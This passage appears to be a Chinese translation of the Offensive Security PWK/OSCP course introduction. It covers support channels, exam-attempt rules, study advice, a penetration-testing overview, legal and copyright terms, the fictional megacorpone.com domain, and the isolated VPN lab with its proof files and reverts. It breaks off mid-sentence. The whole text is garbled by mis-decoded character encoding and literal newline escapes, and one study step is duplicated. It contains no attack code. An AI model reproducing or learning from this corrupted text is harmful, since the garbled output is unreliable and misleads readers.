å®æ—¶æ”¯æŒ\n\nå®æ—¶æ”¯æŒ$^3$å°†ä½¿æ‚¨èƒ½å¤Ÿç›´æ¥ä¸æˆ‘ä»¬çš„å­¦ç”Ÿç®¡ç†å‘˜æ²Ÿé€šã€‚è¿™äº›æ˜¯å‚åŠ è¿‡PWKè¯¾ç¨‹å¹¶é€šè¿‡OSCPè®¤è¯è€ƒè¯•çš„ Offensive Security çš„å·¥ä½œäººå‘˜ã€‚\n\nå­¦ç”Ÿç®¡ç†å‘˜å¯ä»¥å¸®åŠ©è§£å†³æŠ€æœ¯é—®é¢˜ï¼Œä½†ä»–ä»¬ä¹Ÿå¯ä»¥æ¾„æ¸…æ•™æå’Œç»ƒä¹ ä¸­çš„é¡¹ç›®ã€‚æ­¤å¤–ï¼Œå¦‚æœä½ å·²ç»å°½åŠ›äº†ï¼Œä½†åœ¨å®éªŒæœºä¸Šå®Œå…¨å¡ä½äº†ï¼Œå­¦ç”Ÿç®¡ç†å‘˜å¯èƒ½ä¼šæä¾›ä¸€ä¸ªå°æç¤ºæ¥å¸®åŠ©ä½ å‰è¿›ã€‚\n\nè®°ä½ï¼Œå­¦ç”Ÿç®¡ç†å‘˜æä¾›çš„ä¿¡æ¯å°†åŸºäºä½ èƒ½å¤Ÿæä¾›çš„ç»†èŠ‚æ•°é‡ã€‚ä½ èƒ½æä¾›çš„å…³äºä½ å·²ç»å°è¯•è¿‡çš„ä¸œè¥¿å’Œä½ èƒ½å¤Ÿè§‚å¯Ÿåˆ°çš„ç»“æœçš„ç»†èŠ‚è¶Šå¤šè¶Šå¥½ã€‚\n\n### OSCP è€ƒè¯•æœºä¼š\n\nåœ¨ä½ åˆæ¬¡è´­ä¹° PWK è¯¾ç¨‹æ—¶ï¼ŒåŒ…æ‹¬ä¸€æ¬¡ OSCP è®¤è¯è€ƒè¯•$^4$çš„å°è¯•ã€‚è¯¥è€ƒè¯•æ˜¯å¯é€‰çš„ï¼Œæ‰€ä»¥ç”±ä½ è‡ªå·±å†³å®šæ˜¯å¦è¦å‚åŠ è€ƒè¯•ã€‚åœ¨ä½ çš„å®éªŒæ—¶é—´ç»“æŸåï¼Œä½ æœ‰ 120 å¤©æ—¶é—´æ¥å®‰æ’å’Œå®Œæˆä½ çš„è€ƒè¯•å°è¯•ã€‚120 å¤©åï¼Œå°è¯•å°†è¿‡æœŸã€‚\n\nå¦‚æœä½ çš„è€ƒè¯•å°è¯•è¿‡æœŸï¼Œä½ å¯ä»¥å†è´­ä¹°ä¸€æ¬¡ï¼Œå¹¶åœ¨è´­ä¹°æ—¥æœŸçš„120å¤©å†…å‚åŠ è€ƒè¯•ã€‚\n\nå¦‚æœä½ åœ¨ä»æœ‰æœªä½¿ç”¨çš„è€ƒè¯•å°è¯•æ—¶è´­ä¹°äº†å®éªŒå®¤å»¶æœŸï¼Œä½ çš„è€ƒè¯•å°è¯•çš„åˆ°æœŸæ—¥å°†è¢«ç§»è‡³å®éªŒå®¤å»¶æœŸç»“æŸåçš„120å¤©ã€‚è¦é¢„å®šä½ çš„OSCPè€ƒè¯•ï¼Œè¯·ä½¿ç”¨ä½ çš„ä¸ªäººåŒ–è€ƒè¯•å®‰æ’é“¾æ¥ã€‚è¿™ä¸ªé“¾æ¥åŒ…æ‹¬åœ¨æ¬¢è¿åŒ…çš„ç”µå­é‚®ä»¶ä¸­ã€‚\n\nä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ä½ çš„PWKæ§åˆ¶é¢æ¿æ‰¾åˆ°è¿™ä¸ªé“¾æ¥ã€‚\n\n## æ¥è¿‘è¯¾ç¨‹çš„æ€»ä½“ç­–ç•¥\n\næ¯ä¸ªå­¦ç”Ÿéƒ½æ˜¯ç‹¬ä¸€æ— äºŒçš„ï¼Œæ‰€ä»¥æ²¡æœ‰ä¸€ä¸ªç»å¯¹æœ€å¥½çš„æ–¹æ³•æ¥å¤„ç†è¿™ä¸ªè¯¾ç¨‹å’Œææ–™ã€‚æˆ‘ä»¬å¸Œæœ›é¼“åŠ±ä½ ä»¥ä½ è‡ªå·±èˆ’é€‚çš„é€Ÿåº¦å®Œæˆè¯¾ç¨‹ã€‚ä½ è¿˜éœ€è¦è¿ç”¨æ—¶é—´ç®¡ç†æŠ€å·§æ¥ä¿æŒè‡ªå·±çš„è¿›åº¦ã€‚\n\næˆ‘ä»¬å»ºè®®å°†ä»¥ä¸‹å†…å®¹ä½œä¸ºè¯¾ç¨‹ææ–™çš„ä¸€ä¸ªéå¸¸æ™®éçš„æ–¹æ³•ï¼š\n\n1. å¤ä¹ åŒ…æ‹¬åœ¨æ¬¢è¿å’Œè¯¾ç¨‹ä¿¡æ¯ç”µå­é‚®ä»¶ä¸­çš„æ‰€æœ‰ä¿¡æ¯ã€‚\n2. å¤ä¹ ä¸€ä¸‹è¯¾ç¨‹ææ–™ã€‚\n3. å®Œæˆæ‰€æœ‰çš„è¯¾ç¨‹ç»ƒä¹ ã€‚\n4. å®Œæˆæ‰€æœ‰çš„è¯¾ç¨‹ç»ƒä¹ ã€‚\n\n### æ¬¢è¿å’Œè¯¾ç¨‹ä¿¡æ¯ç”µå­é‚®ä»¶\n\né¦–å…ˆï¼Œä¹Ÿæ˜¯æœ€é‡è¦çš„ï¼ŒèŠ±æ—¶é—´é˜…è¯»ä½ åœ¨è¯¾ç¨‹å¼€å§‹æ—¥æ”¶åˆ°çš„ç”µå­é‚®ä»¶ä¸­åŒ…å«çš„æ‰€æœ‰ä¿¡æ¯ã€‚è¿™äº›ç”µå­é‚®ä»¶åŒ…æ‹¬è¯¸å¦‚æ‚¨çš„VPNåŒ…ã€å®éªŒå®¤å’Œè®ºå›è¯ä¹¦ä»¥åŠæ§åˆ¶é¢æ¿çš„URLã€‚ å®ƒä»¬è¿˜åŒ…æ‹¬è¯¾ç¨‹å¸¸è§é—®é¢˜è§£ç­”ã€ç‰¹åˆ«æœ‰ç”¨çš„è®ºå›ä¸»é¢˜å’Œæ”¯æŒé¡µé¢çš„URLã€‚\n\n### è¯¾ç¨‹ææ–™\n\nä¸€æ—¦ä½ å›é¡¾äº†ä¸Šè¿°ä¿¡æ¯ï¼Œä½ å°±å¯ä»¥è¿›å…¥è¯¾ç¨‹ææ–™ã€‚ä½ å¯ä»¥é€‰æ‹©ä»è¯¾ç¨‹è§†é¢‘å¼€å§‹ï¼Œç„¶ååœ¨å®éªŒæŒ‡å—ä¸­å¤ä¹ è¯¥æ¨¡å—çš„ä¿¡æ¯ï¼Œæˆ–è€…åä¹‹äº¦ç„¶ï¼Œè¿™å–å†³äºä½ å–œæ¬¢çš„å­¦ä¹ æ–¹å¼ã€‚å½“ä½ é€šè¿‡è¯¾ç¨‹ææ–™æ—¶ï¼Œä½ å¯èƒ½éœ€è¦é‡æ–°è§‚çœ‹æˆ–é‡æ–°é˜…è¯»æ¨¡å—ä»¥å®Œå…¨æŒæ¡å†…å®¹ã€‚\n\næˆ‘ä»¬å»ºè®®æŠŠè¿™ä¸ªè¯¾ç¨‹å½“ä½œé©¬æ‹‰æ¾ï¼Œè€Œä¸æ˜¯å†²åˆºã€‚åœ¨æ¨è¿›è¯¾ç¨‹ä¹‹å‰ï¼Œä¸è¦å®³æ€•åœ¨å›°éš¾çš„æ¦‚å¿µä¸Šå¤šèŠ±æ—¶é—´ã€‚\n\n### è¯¾ç¨‹ç»ƒä¹ \n\næˆ‘ä»¬å»ºè®®ä½ åœ¨è¿›å…¥ä¸‹ä¸€ä¸ªæ¨¡å—ä¹‹å‰ï¼Œå®Œå…¨å®Œæˆæ¯ä¸ªæ¨¡å—æœ«å°¾çš„ç»ƒä¹ ã€‚å®ƒä»¬å°†æµ‹è¯•ä½ å¯¹ææ–™çš„ç†è§£ï¼Œå¹¶å»ºç«‹ä½ å‰è¿›çš„ä¿¡å¿ƒã€‚\n\nå®Œæˆè¿™äº›ç»ƒä¹ æ‰€éœ€çš„æ—¶é—´å’Œç²¾åŠ›å¯èƒ½å–å†³äºä½ ç°æœ‰çš„æŠ€èƒ½ã€‚è¯·æ³¨æ„ï¼Œæœ‰äº›ç»ƒä¹ æ˜¯å›°éš¾çš„ï¼Œå¯èƒ½éœ€è¦å¤§é‡çš„æ—¶é—´ã€‚æˆ‘ä»¬å¸Œæœ›é¼“åŠ±ä½ æŒä¹‹ä»¥æ’ï¼Œå°¤å…¶æ˜¯å¯¹è¾ƒéš¾çš„ç»ƒä¹ ã€‚å®ƒä»¬å¯¹åŸ¹å…»Offsecçš„ \"åŠªåŠ›å°è¯• \"çš„å¿ƒæ€ç‰¹åˆ«æœ‰å¸®åŠ©ã€‚\n\n### PWK å®éªŒå®¤\n\nä¸€æ—¦ä½ å®Œæˆäº†è¯¾ç¨‹ææ–™ï¼Œä½ å°±åº”è¯¥å‡†å¤‡å¥½å»åšå®éªŒï¼Œç›®çš„æ˜¯æ¸—é€æ¯å°æœºå™¨å¹¶è·å¾—ä¸€ä¸ªé«˜æƒé™çš„äº¤äº’å¼ Shellã€‚\n\nè¯¾ç¨‹ç»ƒä¹ åŒ…æ‹¬æœ‰å…³å„ç§å®éªŒå®¤æœºå™¨çš„ä¿¡æ¯ï¼Œå¦‚æœä½ ä¸€ç›´å‹¤äºè®°ç¬”è®°ï¼Œä½ å°†æœ‰è¶³å¤Ÿçš„èƒ½åŠ›å»æ”»å…‹å®éªŒå®¤ä¸­çš„ä¸€äº› \"ä½æ‚¬çš„æœå®\"ã€‚\n\nä¸‹ä¸€æ­¥æ˜¯åº”ç”¨ä»è¯¾ç¨‹ä¸­å­¦åˆ°çš„çŸ¥è¯†ï¼Œä»å¯¹ç½‘ç»œçš„å…¶ä»–éƒ¨åˆ†è¿›è¡Œå½»åº•çš„ä¿¡æ¯æ”¶é›†å¼€å§‹ï¼Œå¹¶åˆ©ç”¨ä»è¢«æ”»å‡»çš„æœºå™¨ä¸Šè·å¾—çš„ä¿¡æ¯æ¥é”å®šå…¶ä»–æœºå™¨ã€‚ å¦‚æœä½ æ­£åœ¨ä¸ºå¦‚ä½•å¤„ç†ä¸€å°ç‰¹å®šçš„æœºå™¨è€Œè‹¦æ¼ï¼Œå¯ä»¥è€ƒè™‘å»å­¦ç”Ÿè®ºå›ä¸Šçœ‹çœ‹ï¼Œä½œä¸ºç¬¬ä¸€æ­¥ã€‚\n\nå¦‚æœè®ºå›æ²¡æœ‰ä¸ºä½ æä¾›ä»»ä½•æœ‰ç”¨çš„ä¿¡æ¯ï¼Œä½ åº”è¯¥è”ç³»å®æ—¶æ”¯æŒï¼Œçœ‹çœ‹æ˜¯å¦æœ‰ä»»ä½•å…¶ä»–æŒ‡å¯¼ã€‚\n\n## è·å¾—æ”¯æŒ\n\nPWKä¸æ˜¯ä¸€ä¸ªå›ºå®šé€Ÿåº¦çš„è¯¾ç¨‹ã€‚ è¿™æ„å‘³ç€ä½ å¯ä»¥æŒ‰ç…§è‡ªå·±çš„èŠ‚å¥è¿›è¡Œï¼Œåœ¨å¯¹ä½ æ¥è¯´æœ‰éš¾åº¦çš„é¢˜ç›®ä¸ŠèŠ±æ›´å¤šæ—¶é—´ã€‚åˆ©ç”¨è¿™ä¸ªè¯¾ç¨‹çš„èŠ‚å¥ï¼Œä¸è¦å®³æ€•åœ¨ä¸€ä¸ªå›°éš¾çš„æ–°è¯¾é¢˜æˆ–æ–¹æ³•ä¸Šå¤šèŠ±ç‚¹æ—¶é—´ã€‚æ²¡æœ‰ä»€ä¹ˆæ¯”è‡ªå·±æ‘¸ç´¢å‡ºä¸€äº›ä¸œè¥¿æ›´æœ‰æ„ä¹‰çš„äº†ã€‚\n\nè¯è™½å¦‚æ­¤ï¼Œæœ‰æ—¶è”ç³»æ”¯æŒæ˜¯å®Œå…¨åˆé€‚çš„ã€‚åœ¨ä½ è¿™æ ·åš**ä¹‹å‰**ï¼Œè¯·ç†è§£æˆ‘ä»¬å¸Œæœ›ä½ åœ¨è¿›å…¥å®éªŒå®¤ä¹‹å‰å·²ç»çœ‹è¿‡æ‰€æœ‰çš„è¯¾ç¨‹ææ–™ï¼Œå¹¶ä¸”åœ¨éœ€è¦çš„æ—¶å€™ä¼šæ¯«ä¸çŠ¹è±«åœ°è®©ä½ å›åˆ°è¯¾ç¨‹ææ–™ä¸­ã€‚ä¸ä»…å¦‚æ­¤ï¼Œæˆ‘ä»¬è¿˜å¸Œæœ›ä½ èƒ½é€šè¿‡è¿›è¡Œé¢å¤–çš„ç ”ç©¶æ¥æ·±å…¥æŒ–æ˜è¯¥ä¸»é¢˜é¢†åŸŸã€‚\n\nåœ¨ä¸æ”¯æŒéƒ¨é—¨è”ç³»ä¹‹å‰ï¼Œä»¥ä¸‹å¸¸è§é—®é¢˜é¡µé¢å¯èƒ½æœ‰åŠ©äºå›ç­”ä½ çš„ä¸€äº›é—®é¢˜ï¼ˆåœ¨æ²¡æœ‰VPNçš„æƒ…å†µä¸‹éƒ½å¯ä»¥è®¿é—®ï¼‰ï¼š\n\n- https://support.offensive-security.com/\n- https://www.offensive-security.com/faq/\n\nå¦‚æœä½ çš„é—®é¢˜æ²¡æœ‰å¾—åˆ°è§£å†³ï¼Œæˆ‘ä»¬å»ºè®®ä½ æŸ¥çœ‹å­¦ç”Ÿè®ºå›ï¼Œè¯¥è®ºå›ä¹Ÿå¯ä»¥åœ¨å†…éƒ¨VPNå®éªŒå®¤ç½‘ç»œä¹‹å¤–è®¿é—®ã€‚å¦‚æœä½ ä»ç„¶æ— æ³•æ‰¾åˆ°ä½ éœ€è¦çš„å¸®åŠ©ï¼Œä½ å¯ä»¥é€šè¿‡è®¿é—®æ”¯æŒé¡µé¢çš„å®æ—¶æ”¯æŒ$^5$æˆ–å‘é€ç”µå­é‚®ä»¶ï¼ˆhelp@offensive-security.comï¼‰ä¸æˆ‘ä»¬çš„å­¦ç”Ÿç®¡ç†å‘˜å–å¾—è”ç³»ã€‚\n\n## å…³äºæ¸—é€æµ‹è¯•\n\næ¸—é€æµ‹è¯•æ˜¯å¯¹ç›®æ ‡æˆ–è¾¹ç•Œè¿›è¡Œç ”ç©¶å’Œæ”»å‡»çš„ä¸€ä¸ªæŒç»­å¾ªç¯ã€‚æ”»å‡»åº”è¯¥æ˜¯ç»“æ„åŒ–çš„ï¼Œç»è¿‡è®¡ç®—çš„ï¼Œå¹¶ä¸”åœ¨å¯èƒ½çš„æƒ…å†µä¸‹ï¼Œåœ¨å®éªŒå®¤ä¸­è¿›è¡ŒéªŒè¯ï¼Œç„¶åå†åœ¨å®é™…ç›®æ ‡ä¸Šå®æ–½ã€‚è¿™å°±æ˜¯æˆ‘ä»¬å¯¹æ¸—é€æµ‹è¯•è¿‡ç¨‹çš„å¯è§†åŒ–ï¼š\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e5327495-6c39-4ed0-b1a4-525cf2a267d9/Untitled.png)\n\nå›¾1ï¼šæ¸—é€æµ‹è¯•æ–¹æ³•çš„ç¤ºæ„å›¾\n\næ­£å¦‚è¯¥æ¨¡å‹å¯èƒ½æš—ç¤ºçš„é‚£æ ·ï¼Œä½ æ”¶é›†çš„ä¿¡æ¯è¶Šå¤šï¼ŒæˆåŠŸç©¿é€çš„æ¦‚ç‡å°±è¶Šé«˜ã€‚ä¸€æ—¦ä½ ç©¿é€äº†æœ€åˆçš„ç›®æ ‡è¾¹ç•Œï¼Œä½ é€šå¸¸ä¼šå†æ¬¡å¼€å§‹è¿™ä¸ªå¾ªç¯ã€‚ä¾‹å¦‚ï¼Œä½ å¯èƒ½ä¼šæ”¶é›†æœ‰å…³å†…éƒ¨ç½‘ç»œçš„ä¿¡æ¯ï¼Œä»¥ä¾¿æ›´æ·±å…¥åœ°æ¸—é€å®ƒã€‚\n\næœ€ç»ˆï¼Œæ¯ä¸ªå®‰å…¨ä¸“å®¶éƒ½ä¼šåˆ¶å®šè‡ªå·±çš„ç‰¹å®šæ–¹æ³•ï¼Œé€šå¸¸æ˜¯åŸºäºç‰¹å®šçš„æŠ€æœ¯ä¼˜åŠ¿ã€‚æˆ‘ä»¬é¼“åŠ±ä½ æŸ¥çœ‹è¯¸å¦‚å¼€æ”¾ç½‘ç»œåº”ç”¨å®‰å…¨é¡¹ç›®ï¼ˆOWASPï¼‰$^6$çš„ç½‘é¡µï¼Œäº†è§£ä¸€äº›å¸¸ç”¨çš„æ¸—é€æµ‹è¯•æ–¹æ³•ã€‚\n\n## æ³•å¾‹\n\nè¯·èŠ±æ—¶é—´é˜…è¯»æˆ‘ä»¬ä¸‹é¢çš„æ­£å¼ç‰ˆæƒå£°æ˜ã€‚\n\nåœ¨ä½ è¿™æ ·åšä¹‹å‰ï¼Œæˆ‘ä»¬æƒ³è§£é‡Šä¸€ä¸‹ï¼Œæœ¬å‡ºç‰ˆç‰©ä»…ä¾›ä½ ä¸ªäººä½¿ç”¨ã€‚ä»»ä½•å¤åˆ¶æœ¬å‡ºç‰ˆç‰©æˆ–ä¸ä»»ä½•ç¬¬ä¸‰æ–¹åˆ†äº«æœ¬å‡ºç‰ˆç‰©çš„å…¨éƒ¨æˆ–éƒ¨åˆ†å†…å®¹çš„è¡Œä¸ºéƒ½è¿åäº†ï¼ˆaï¼‰æˆ‘ä»¬çš„çŸ¥è¯†äº§æƒï¼ˆbï¼‰æ‚¨åœ¨æˆ‘ä»¬è¿™é‡Œæ³¨å†Œæ—¶æ¥å—çš„åˆåŒæ¡æ¬¾ï¼ˆcï¼‰æˆ‘ä»¬çš„å­¦æœ¯æ”¿ç­–ã€‚\n\nè¿™åŒ…æ‹¬:\n\n- é€šè¿‡åœ¨ä»»ä½•ç¬¬ä¸‰æ–¹å¹³å°ã€èµ„æºåº“æˆ–ç¤¾äº¤åª’ä½“ç½‘ç«™ä¸Šå‘å¸ƒæœ¬å‡ºç‰ˆç‰©ï¼Œå‘å…¶ä»–äººæä¾›ã€‚\n- ç”±äºä½ æ²¡æœ‰å……åˆ†æ³¨æ„ä¿æŠ¤æœ¬å‡ºç‰ˆç‰©ï¼Œæ— æ„ä¸­åˆ†äº«äº†æœ¬å‡ºç‰ˆç‰©\n- å°†æœ¬å‡ºç‰ˆç‰©çš„å…¨éƒ¨æˆ–éƒ¨åˆ†å†…å®¹ç”¨äºæ‚¨ä¸ªäººåŸ¹è®­ä»¥å¤–çš„ä»»ä½•ç›®çš„ï¼ŒåŒ…æ‹¬æä¾›æˆ–å‘ŠçŸ¥ä»»ä½•å…¶ä»–åŸ¹è®­è¯¾ç¨‹çš„å†…å®¹æˆ–ç”¨äºä»»ä½•å…¶ä»–å•†ä¸šç›®çš„ã€‚\n\næˆ‘ä»¬çš„å­¦æœ¯æ”¿ç­–å¯ä»¥åœ¨ä»¥ä¸‹ç½‘ç«™æ‰¾åˆ° https://www.offensive-security.com/legal-docs/ åœ¨æˆ‘ä»¬çš„åˆ¤æ–­ä¸­ï¼Œå¦‚æœæˆ‘ä»¬å‘ç°ä½ è¿åäº†ï¼š\n\n- æˆ‘ä»¬å°†æ’¤é”€ä½ å·²è·å¾—çš„æ‰€æœ‰ç°æœ‰ Offensive Security è®¤è¯\n- æˆ‘ä»¬å°†ç»ˆèº«å–æ¶ˆä½ å‚åŠ ä»»ä½• Offensive Security è¯¾ç¨‹å’Œè€ƒè¯•çš„èµ„æ ¼\n- æˆ‘ä»¬å°†ç»ˆèº«å–æ¶ˆä½ ä»Šåè´­ä¹° Offensive Security äº§å“çš„èµ„æ ¼\n\nCopyright Â© 2020 Offsec Services Ltd. ç‰ˆæƒæ‰€æœ‰ã€‚ä¿ç•™æ‰€æœ‰æƒåˆ©--æœªç»Offensive Securityäº‹å…ˆä¹¦é¢è®¸å¯ï¼Œæœ¬å‡ºç‰ˆç‰©/è§†é¢‘çš„ä»»ä½•éƒ¨åˆ†å‡ä¸å¾—å¤åˆ¶ã€å‡ºç‰ˆã€å…±äº«ã€å†åˆ†å‘ã€å†è®¸å¯ã€ä¼ è¾“ã€æ›´æ”¹ã€ç”¨äºåˆ›é€ è¡ç”Ÿä½œå“æˆ–ä»¥ä»»ä½•å…¶ä»–æ–¹å¼åˆ©ç”¨ã€‚\n\nä»¥ä¸‹æ–‡ä»¶åŒ…å«äº†æœ¬è¯¾ç¨‹çš„å®éªŒç»ƒä¹ ï¼Œåªèƒ½åœ¨Offensive Securityæ‰˜ç®¡çš„å®éªŒç¯å¢ƒä¸­è¿›è¡Œå°è¯•ã€‚ è¯·æ³¨æ„ï¼Œå¦‚æœåœ¨æ²¡æœ‰æ˜ç¡®è®¸å¯çš„æœºå™¨ä¸Šå°è¯•æµ‹è¯•å’Œæ”»å‡»ï¼Œå®éªŒå®¤æŒ‡å—ä¸­æè¿°çš„å¤§å¤šæ•°æ”»å‡»éƒ½æ˜¯éæ³•çš„ã€‚ç”±äº Offensive Security å…¬å¸çš„å®éªŒå®¤ç¯å¢ƒä¸äº’è”ç½‘éš”ç¦»ï¼Œåœ¨å®éªŒå®¤å†…è¿›è¡Œæ”»å‡»æ˜¯å®‰å…¨çš„ã€‚Offensive Security å…¬å¸æ²¡æœ‰æˆæƒä½ åœ¨å…¶æ‰˜ç®¡çš„å®éªŒå®¤ç¯å¢ƒä¹‹å¤–è¿›è¡Œè¿™äº›æ”»å‡»ï¼Œå¹¶å¯¹ä»»ä½•æ­¤ç±»è¡Œä¸ºä¸æ‰¿æ‹…ä»»ä½•è´£ä»»æˆ–ä¹‰åŠ¡ã€‚\n\n## [DomainsMegaCorpone.com](http://DomainsMegaCorpone.com) å’Œ Sandbox.local åŸŸå\n\n[megacorpone.com](http://megacorpone.com/) åŸŸååŠå…¶å­åŸŸåä»£è¡¨äº†ä¸€ä¸ªç”± Offensive Security åˆ›å»ºçš„è™šæ„å…¬å¸ã€‚å®ƒæœ‰ä¸€ä¸ªçœ‹ä¼¼è„†å¼±çš„å¤–éƒ¨ç½‘ç»œå­˜åœ¨ï¼Œè¿™æ˜¯è¯´æ˜æ•´ä¸ªè¯¾ç¨‹ä¸­æŸäº›æ¦‚å¿µçš„ç†æƒ³é€‰æ‹©ã€‚\n\nè¯·æ³¨æ„ï¼Œè¯¥åŸŸå¯åœ¨å†…éƒ¨VPNå®éªŒå®¤ç½‘ç»œä¹‹å¤–è®¿é—®ï¼Œåªèƒ½åœ¨è¯¾ç¨‹ç»ƒä¹ ä¸­ç”¨äºè¢«åŠ¨å’Œä¸»åŠ¨æ”¶é›†ä¿¡æ¯ã€‚ä¸¥ç¦ä¸»åŠ¨å°è¯•ç ´åå®ƒã€‚\n\nsandbox.local åŸŸä»£è¡¨ä¸€ä¸ªè™šæ„çš„å…¬å¸å†…éƒ¨ç½‘ç»œï¼Œç”¨æ¥æ¼”ç¤ºä½¿ç”¨è¯¾ç¨‹ä¸­æ‰€æ¶‰åŠçš„æ–¹æ³•å’ŒæŠ€æœ¯è¿›è¡Œçš„å…¨é¢æ¸—é€æµ‹è¯•ã€‚\n\nsandbox.local åŸŸåªèƒ½é€šè¿‡VPNè®¿é—®ï¼Œä½œä¸ºä½ å®éªŒå®¤è®¿é—®çš„ä¸€éƒ¨åˆ†ã€‚\n\n## å…³äº PWK VPN å®éªŒå®¤\n\nPWKå®éªŒå®¤æä¾›äº†ä¸€ä¸ªéš”ç¦»çš„ç¯å¢ƒï¼ŒåŒ…å«å„ç§æ˜“å—æ”»å‡»çš„æœºå™¨ã€‚ä½¿ç”¨å®éªŒå®¤æ¥å®Œæˆè¯¾ç¨‹ç»ƒä¹ ï¼Œå¹¶ç»ƒä¹ è¯¾ç¨‹ææ–™ä¸­æ‰€æ•™æˆçš„æŠ€æœ¯ã€‚\n\nä¸‹å›¾æ˜¯ PWK å®éªŒå®¤çš„ç®€åŒ–å›¾ã€‚\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/abcf00dd-2645-4dbc-90e0-74641128b71e/Untitled.png)\n\nå›¾2ï¼šVPN å®éªŒå®¤çš„ç®€åŒ–ç¤ºæ„å›¾\n\nä¸€æ—¦ä½ å®Œæˆäº†è¯¾ç¨‹è§†é¢‘å’Œ PDF å®éªŒæŒ‡å—ï¼Œä½ å°†æ‹¥æœ‰æ¸—é€å®éªŒå®¤ä¸­å¤§å¤šæ•°è„†å¼±æœºå™¨æ‰€éœ€çš„åŸºæœ¬æŠ€èƒ½ã€‚æœ€åˆï¼Œä½ å°†é€šè¿‡ VPN è¿æ¥åˆ°å­¦ç”Ÿç½‘ç»œã€‚ éšç€è¯¾ç¨‹çš„è¿›è¡Œï¼Œä½ å°†ä¼šä»¥é»‘å®¢çš„æ–¹å¼è¿›å…¥å…¶ä»–ç½‘ç»œã€‚æŸäº›æœºå™¨éœ€è¦é¢å¤–çš„ç ”ç©¶å’Œå¾ˆå¤§çš„å†³å¿ƒæ‰èƒ½æ”»ç ´å®ƒä»¬ã€‚\n\næ¯å°æœºå™¨éƒ½åŒ…å«ä¸€ä¸ª **proof.txt** æ–‡ä»¶ï¼Œä½œä¸ºä½ å¦¥åçš„æˆ˜åˆ©å“ï¼Œä½†è¯·è®°ä½ï¼Œç›®æ ‡ä¸æ˜¯å…·ä½“æ‰¾åˆ°**proof.txt** æ–‡ä»¶ã€‚ç›¸åï¼Œä½ è¦å°è¯•åœ¨æ¯å°æœºå™¨ä¸Šè·å¾—ä¸€ä¸ª root/SYSTEM çº§åˆ«çš„äº¤äº’å¼å¤–å£³ã€‚ æœ‰äº›æœºå™¨å¯èƒ½è¿˜åŒ…å«ä¸€ä¸ª **network-secret.txt** æ–‡ä»¶ã€‚ä½ å¯ä»¥å°†è¯¥æ–‡ä»¶çš„å†…å®¹æäº¤ç»™ä½ çš„æ§åˆ¶é¢æ¿ï¼Œä»¥è§£é”å°†ITã€å¼€å‘å’Œç®¡ç†éƒ¨é—¨ç½‘ç»œä¸­çš„è™šæ‹Ÿæœºæ¢å¤åˆ°åŸå§‹çŠ¶æ€çš„èƒ½åŠ›ã€‚\n\nè¯·æ³¨æ„ï¼Œæœ¬æŒ‡å—ï¼ˆå’Œè§†é¢‘ï¼‰ä¸­ä»‹ç»çš„ IP åœ°å€ä¸ä¸€å®šåæ˜  Offensive Security å®éªŒå®¤çš„ IP åœ°å€ã€‚ä¸è¦è¯•å›¾é€å­—é€å¥åœ°å¤åˆ¶å®éªŒå®¤æŒ‡å—ä¸­çš„ä¾‹å­ã€‚ ä½ å°†éœ€è¦æ ¹æ®ä½ çš„å…·ä½“å®éªŒå®¤é…ç½®æ¥è°ƒæ•´è¿™äº›ä¾‹å­ã€‚\n\nä½ åº”è¯¥é’ˆå¯¹çš„æœºå™¨æ˜¯ï¼š\n\nè¡¨1 - Offensive Security å®éªŒå®¤çš„ç›®æ ‡èŒƒå›´\n\nä½ æ‰€è¿æ¥çš„å®éªŒå®¤æ˜¯ç”±ä¸€äº›ä¸åŒçš„å­¦ç”Ÿå…±äº«çš„ã€‚æˆ‘ä»¬é™åˆ¶æ¯ä¸ªå®éªŒå®¤çš„å­¦ç”Ÿäººæ•°ï¼Œä»¥å°½é‡å‡å°‘æœ‰ä¸€ä¸ªä»¥ä¸Šçš„å­¦ç”ŸåŒæ—¶åœ¨åŒä¸€ç›®æ ‡æœºä¸Šå·¥ä½œçš„å¯èƒ½æ€§ã€‚\n\n### å®éªŒå®¤è­¦å‘Š\n\nå†…éƒ¨VPNå®éªŒå®¤ç½‘ç»œ**æ˜¯ä¸€ä¸ªæ¶åŠ£çš„ç¯å¢ƒ**ï¼Œä½ ä¸åº”è¯¥åœ¨ç”¨äºè¿æ¥å®éªŒå®¤çš„Kali Linuxè™šæ‹Ÿæœºä¸Šå­˜å‚¨æ•æ„Ÿä¿¡æ¯ã€‚å­¦ç”Ÿä¸å­¦ç”Ÿä¹‹é—´çš„VPNæµé‡æ˜¯ä¸å…è®¸çš„ï¼Œä½†æ˜¯ï¼Œä½ å¯ä»¥é€šè¿‡åœ¨ä¸ä½¿ç”¨æœåŠ¡æ—¶åœæ­¢è¿™äº›æœåŠ¡ï¼Œå¹¶ç¡®ä¿åœ¨ä½ çš„Kali Linuxç³»ç»Ÿä¸Šæ”¹å˜ä»»ä½•é»˜è®¤å¯†ç æ¥å¸®åŠ©ä¿æŠ¤è‡ªå·±ã€‚\n\n### æ§åˆ¶é¢æ¿\n\nä¸€æ—¦ç™»å½•åˆ°å†…éƒ¨ VPN å®éªŒå®¤ç½‘ç»œï¼Œä½ å°±å¯ä»¥è¿›å…¥ä½ çš„ PWK æ§åˆ¶é¢æ¿ã€‚PWK æ§åˆ¶é¢æ¿å°†å¸®åŠ©ä½ æ¢å¤ä½ çš„å®¢æˆ·æœºå’Œå®éªŒæœºï¼Œæˆ–é¢„è®¢ä½ çš„è€ƒè¯•ã€‚ä¸€æ—¦ä½ æ‰¾åˆ° **network-secret.txt** æ–‡ä»¶ï¼Œä½ å°†ä½¿ç”¨æ§åˆ¶é¢æ¿ï¼Œæäº¤è¯¥æ–‡ä»¶çš„å†…å®¹ï¼Œå¹¶è§£é”æ¢å¤æœºå™¨çš„èƒ½åŠ›ã€‚æ–‡ä»¶ï¼Œå¹¶è§£é”æ¢å¤ä½äºä½ æ‰€å‘ç°çš„å…¶ä»–ç½‘ç»œä¸­çš„æœºå™¨çš„èƒ½åŠ›ã€‚\n\næ§åˆ¶é¢æ¿çš„ç½‘å€åˆ—åœ¨æ¬¢è¿åŒ…çš„ç”µå­é‚®ä»¶ä¸­ã€‚\n\n### æ¢å¤\n\næ¯ä¸ªå­¦ç”Ÿæ¯24å°æ—¶éƒ½æœ‰12æ¬¡æ¢å¤çš„æœºä¼šã€‚æ¢å¤åŠŸèƒ½ä½¿ä½ å¯ä»¥å°†ç‰¹å®šçš„å®éªŒæœºæ¢å¤åˆ°åŸå§‹çŠ¶æ€ã€‚å¦‚æœä½ 